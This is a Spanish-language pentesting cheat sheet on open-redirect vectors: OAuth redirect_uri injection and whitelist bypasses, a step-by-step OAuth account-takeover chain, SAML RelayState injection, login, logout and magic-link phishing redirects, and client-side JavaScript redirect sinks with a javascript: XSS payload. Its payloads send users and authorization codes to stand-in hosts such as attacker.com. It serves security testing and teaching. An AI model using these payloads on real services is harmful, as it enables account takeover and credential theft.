---
aliases:
  - OAuth Redirect URI
  - SAML Redirect
  - Login Redirect
  - Magic Link Redirect
tags:
  - type/cheatsheet
  - vuln/open-redirect
  - vuln/auth-bypass
  - technique/credential-access
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Open Redirect]]'
---
# Open Redirect - Vectores Específicos

***

## OAuth `redirect_uri` Injection

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | OAuth flow con `redirect_uri` controlable → atacante recibe `code` o `access_token` | High impact ATO. |
| Impl Code grant | `?response_type=code&client_id=...&redirect_uri=https://attacker.com` | Si IdP no valida estricto. |
| Impl Implicit grant | `?response_type=token&...&redirect_uri=https://attacker.com#access_token=...` | Direct token leak. |
| `redirect_uri` whitelist suffix | `?redirect_uri=https://target.com.attacker.com` | Suffix bypass. |
| `redirect_uri` con userinfo | `?redirect_uri=https://target.com@attacker.com` | Parser confusion. |
| `redirect_uri` con path traversal | `?redirect_uri=https://target.com/redirect?url=https://attacker.com` | Chain con open redirect en target. |
| `redirect_uri` con fragment | `?redirect_uri=https://target.com#@attacker.com` | Fragment vector. |
| Path-based whitelist | `?redirect_uri=https://target.com/callback/../malicious` | Path traversal. |
| Subdomain wildcard whitelist | `?redirect_uri=https://anysubdomain.target.com/...` | Subdomain takeover combo. |
| Multiple registered URIs | Pick one less-protected | Enumeration. |
| State param missing | OAuth no usa `state` → CSRF en flow | Multi-vector. |
| PKCE missing | No `code_challenge` → CSRF + redirect = full ATO | Modern OAuth. |
| Partial match validation | `redirect_uri=https://target.com.evil.com/callback` | Subdomain prefix. |
| Encoded redirect_uri | `redirect_uri=https%3A%2F%2Fattacker.com` | URL-encoded bypass. |
| Mixed case scheme | `redirect_uri=HtTpS://attacker.com` | Case bypass. |
^or-specific-oauth

### OAuth ATO chain

```
1. Atacante envía link a victim:
   https://idp.target.com/oauth/authorize?
     client_id=abc&
     response_type=code&
     redirect_uri=https://attacker.com/cb&
     scope=read+write
   
2. Victim authenticated → IdP redirects a:
   https://attacker.com/cb?code=AUTH_CODE
   
3. Atacante intercepta code → exchange por access_token:
   POST https://idp.target.com/oauth/token
     code=AUTH_CODE
     client_id=abc
     client_secret=...  (público en algunos casos)
   → access_token=...
   
4. Atacante usa access_token para acceder API target como victim → ATO.
```

___

## SAML Response Redirect

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | SAML SSO usa `RelayState` param para redirect post-auth → atacante controla destination | Federated identity. |
| RelayState injection | `?RelayState=https://attacker.com` | Standard SAML flow. |
| AssertionConsumerServiceURL injection | Param que define ACS endpoint | Atacante recibe SAML response. |
| Identity Provider Initiated SSO | `?SAMLRequest=...&RelayState=https://attacker.com` | IdP-initiated. |
| Service Provider Initiated SSO | RelayState reflejado en SP redirect | SP-initiated. |
| RelayState con bypass de validation | Usar bypasses estándar (userinfo, encoding, etc) | Standard. |
| ACS URL injection | Algunos IdPs aceptan ACS URL del request | Steal SAML assertion. |
| SAMLart artifact redirect | Artifact-based binding edge case | Less common. |
| Combined con XSS | RelayState con javascript: URL | Browser-side. |
| Combined con SAML Replay | Robar SAML response + replay | Auth bypass. |
^or-specific-saml

___

## Login / Logout Flow Redirect

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Login post-auth redirect | `?next=https://attacker.com` | Standard. |
| Login redirect con XSS | `?next=javascript:alert(1)` | If reflected as href. |
| Logout redirect | `/logout?next=https://attacker.com` | Combined with re-login phishing. |
| Logout + auto-login phish | Force logout → atacante hosts fake login at next URL | Full credential theft. |
| Reset password redirect | Post-reset redirect a malicious page | UX confusion. |
| Account creation redirect | Post-signup redirect a phishing | Credential theft. |
| Email confirm redirect | Email link → confirm → redirect | Standard chain. |
| Subscription / billing redirect | Post-purchase redirect a phishing | Financial vector. |
| 2FA setup redirect | After 2FA setup → redirect | Auth flow. |
| OTP redirect | After OTP verification | Same. |
| Forced re-auth redirect | App detect old session → force re-auth → redirect after | Session attack. |
| Multi-step form redirect | Each step has next param | Chain bypass. |
^or-specific-login

___

## Email Magic Link Redirect

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Magic link en email contains redirect param. Atacante envía email phishing con malicious redirect. | Email security combo. |
| Redirect en link | `https://target.com/auth?token=abc&next=https://attacker.com` | Standard. |
| Subdomain mismatch in email | Email enviado de `target.com` con link a `target.com.evil.com` | Trust transfer. |
| Click tracker abuse | Click tracker URL → final URL controlled | Affiliate abuse. |
| Unsubscribe link redirect | One-click unsubscribe + redirect | UX confusion. |
| Re-engagement campaign redirect | Returning user link | Same. |
| Welcome email link redirect | New signup welcome email | Combine signup. |
| Password reset link | Reset URL + redirect | High-value target. |
| Verification link redirect | Email verify + redirect | Standard. |
| Notification email link redirect | App notification → click → redirect | Common. |
| Marketing email | Tracker URL → atacante hosts phish | Affiliate. |
| Combine con XSS | Magic link → XSS → cookie theft | Chain. |
^or-specific-magiclink

___

## JS-Based Client-Side Redirect

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | App usa JavaScript para redirect — `location.href = userInput` | Client-side OR. |
| `location.href = url` | Direct assignment | DOM XSS combo if javascript: scheme. |
| `location.replace(url)` | Method-based | No back button. |
| `location.assign(url)` | Same as = | Standard. |
| `window.location = url` | Equivalent to location.href | Same. |
| `top.location = url` | Frame escape | Iframe contexts. |
| `parent.location = url` | Parent frame nav | Same. |
| Routing libs (React Router) | `history.push(url)` | SPA. |
| Vue Router | `router.push(url)` | Same. |
| Angular Router | `router.navigateByUrl(url)` | Same. |
| `<meta http-equiv="refresh" content="0;url=USER_INPUT">` | Reflected | Server-rendered. |
| `<a href="USER_INPUT">` con click trigger JS | Hybrid | Mixed. |
| Combine con SPA route trick | `#/admin` con malicious params | SPA-specific. |
| `eval(url)` | Catastrophic | Direct code execution. |
| Service Worker fetch handler | `event.respondWith(Response.redirect(...))` | Modern PWA. |
| `navigator.registerProtocolHandler` | App-launch via custom scheme | Edge. |
^or-specific-js

### Workflow client-side OR

```javascript
// VULNERABLE: client-side redirect from URL param
const params = new URLSearchParams(location.search);
const next = params.get('next');
location.href = next;  // OPEN REDIRECT

// Atacante:
// https://target.com/login?next=javascript:alert(document.cookie)
// → location.href = 'javascript:alert(...)' → XSS
```

***
